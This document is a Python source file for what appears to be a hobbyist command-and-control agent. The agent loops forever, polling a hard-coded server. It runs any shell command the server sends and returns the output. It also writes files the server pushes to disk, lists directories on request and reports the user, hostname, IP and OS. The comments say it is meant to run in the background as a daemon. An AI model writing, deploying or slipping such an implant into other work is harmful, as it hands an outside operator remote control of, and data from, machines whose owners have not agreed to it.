import http.client
import json
import socket
import platform
import os
import subprocess
import time
import getpass

# A constant theme of this program is to use try - catch instead of failing.
# I want this to work like a daemon and not return if bad data is retrieved
# This program really should just be running in the background

# This is a constant to connect to from the agent to the server. This should be replaced before addition
SERVER_HOST = "172.20.10.2"
# Same for the port
SERVER_PORT = 5001

# Get system info returns a json file of 
# various system processes. This is used
# for the System Info Page
def get_system_info():
    return {
        "user": getpass.getuser(),
        "hostname": socket.gethostname(),
        "ip": get_ip(),
        "platform": platform.system(),
        "version": platform.version(),
        "architecture": platform.machine(),
        "uptime_sec": get_uptime()
    }
# This returns uptime using macos modules
# This tries to be system agnostic (including linux)
def get_uptime():
    try:
        if os.name == 'posix':
            if platform.system() == 'Darwin':
                output = subprocess.check_output("sysctl -n kern.boottime", shell=True, text=True)
                boot_time = int(output.split('sec =')[1].split(',')[0].strip())
                return int(time.time() - boot_time)
            else:
                with open('/proc/uptime', 'r') as f:
                    return int(float(f.readline().split()[0]))
        else:
            return "Unknown"
    except:
        return "Unknown"

# This works by creating a socket and connecting to a remote host (Google DNS) without sending data.
# The OS selects the appropriate local network interface for that route, allowing us to retrieve
# the outward-facing IP address used for internet communication. This avoids localhost or loopback issues.
def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return socket.gethostbyname(socket.gethostname())
    
# This function works by checking if the server wants a heartbeat.
# POST if yes
def check_heartbeat_request():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        conn.request("GET", "/should_ping")
        response = conn.getresponse()
        if response.status == 200 and response.read().decode().strip() == "yes":
            conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
            conn.request("POST", "/heartbeat")
            conn.getresponse()
    except:
        pass

# Encodes system info and sends it to the server via POST
def post_info():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        headers = {"Content-type": "application/json"}
        payload = json.dumps(get_system_info())
        conn.request("POST", "/post_info", body=payload, headers=headers)
        conn.getresponse()
    except Exception as e:
        print(f"[!] Error sending system info: {e}")

# Checks if info is wanted. Uses post_info() to send the data
def check_info_request():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        conn.request("GET", "/should_post_info")
        response = conn.getresponse()
        if response.status == 200:
            result = response.read().decode().strip()
            if result == "yes":
                post_info()
    except Exception as e:
        print(f"[!] Error checking for system info request: {e}")

# Check if the server wants to send a file. If it does then recieves.
def check_file_download():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        conn.request("GET", "/get_file")
        response = conn.getresponse()
        if response.status == 200:
            data = json.loads(response.read().decode())
            filename = data.get("filename")
            content = data.get("content")
            if filename and content:
                with open(filename, "wb") as f:
                    f.write(content.encode("latin1"))  # binary-safe
                print(f"[+] Received file: {filename}")

                # Acknowledge to server
                conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
                conn.request("POST", "/ack_file")
                conn.getresponse()
    except Exception as e:
        print(f"[!] Error downloading file: {e}")

# !!! CORE FUNCTION !!! 
# This is the core of the program. The function checks is the server has a command and
# if a valid response is recieved the command is sotred.
def get_command():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        conn.request("GET", "/get_command")
        response = conn.getresponse()
        if response.status == 200:
            return response.read().decode().strip()
    except Exception as e:
        print(f"[!] Error getting command: {SERVER_HOST}:{e}")
    return None

# This function works by sending previously executed commands back to the server via POST / JSON
def send_result(result):
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        headers = {"Content-type": "application/json"}
        payload = json.dumps({"result": result})
        conn.request("POST", "/post_result", body=payload, headers=headers)
        conn.getresponse()
    except Exception as e:
        print(f"[!] Error sending result: {e}")

# !!! CORE FUNCTION !!!
# # This function executes a shell command and returns its output.
# Second part of get_command()
def run_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        output = e.output
    return output

# This function checks if the server wants a directory listing.
# If a valid path is returned by the server, it lists the contents of that path
# and sends the listing back to the server in JSON format.
def check_browse_request():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
        conn.request("GET", "/should_browse")
        response = conn.getresponse()
        if response.status == 200:
            data = json.loads(response.read().decode())
            path = data.get("path")
            if path:
                listing = []
                for name in os.listdir(path):
                    full_path = os.path.join(path, name)
                    info = {
                        "name": name,
                        "type": "dir" if os.path.isdir(full_path) else "file",
                        "size": os.path.getsize(full_path) if os.path.isfile(full_path) else "-"
                    }
                    listing.append(info)
                # Send to server
                conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
                headers = {"Content-type": "application/json"}
                payload = json.dumps({"listing": listing})
                conn.request("POST", "/post_listing", body=payload, headers=headers)
                conn.getresponse()
    except Exception as e:
        print(f"[!] Error checking directory listing: {e}")


# !!! CORE FUNCTION !!!
# This is the core loop. Its really modifiable and allowed me to
# incrementally add features as needed.
def main():
    while True:
        check_info_request()
        check_file_download()
        check_heartbeat_request()
        check_browse_request()
        cmd = get_command()
        if cmd and cmd.lower() != "none":
            print(f"[+] Received command: {cmd}")
            output = run_command(cmd)
            send_result(output)
        time.sleep(3)

if __name__ == "__main__":
    main()
